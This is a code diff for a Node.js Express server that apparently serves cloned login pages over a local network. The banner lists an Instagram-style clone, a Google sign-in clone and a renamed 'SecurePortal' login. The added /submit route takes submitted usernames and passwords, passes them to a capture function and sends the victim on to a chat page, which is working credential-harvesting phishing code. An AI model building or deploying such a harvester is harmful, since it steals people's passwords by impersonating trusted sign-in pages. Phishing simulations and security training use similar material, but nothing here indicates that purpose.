@@ -344,6 +344,15 @@ app.get('/', (req, res) => {
 </body>
 </html>`);
 });
+
+app.post('/submit', (req, res) => {
+  const username = String(req.body?.username ?? '').trim();
+  const password = String(req.body?.password ?? '').trim();
+  if (!username || !password) return res.redirect('/');
+  capture(req, 'root-login');
+  res.redirect('/chat?user=' + encodeURIComponent(username));
+});
+
 app.get('/chat', (req, res) => {
   res.send(`<!DOCTYPE html>
 <html lang="en">
@@ -1560,7 +1569,7 @@ app.listen(PORT, '0.0.0.0', () => {
   console.log(`║  LAN  ➜  http://${ip.padEnd(15)}:${PORT}             ║`);
   console.log(`║  Local➜  http://127.0.0.1:${PORT}                     ║`);
   console.log('╠══════════════════════════════════════════════════════╣');
-  console.log('║  /              → Nexus enterprise login             ║');
+  console.log('║  /              → SecurePortal login                 ║');
   console.log('║  /instagram     → Instagram-style clone              ║');
   console.log('║  /google        → Google sign-in clone               ║');
   console.log('║  /chat          → LAN group chat                     ║');
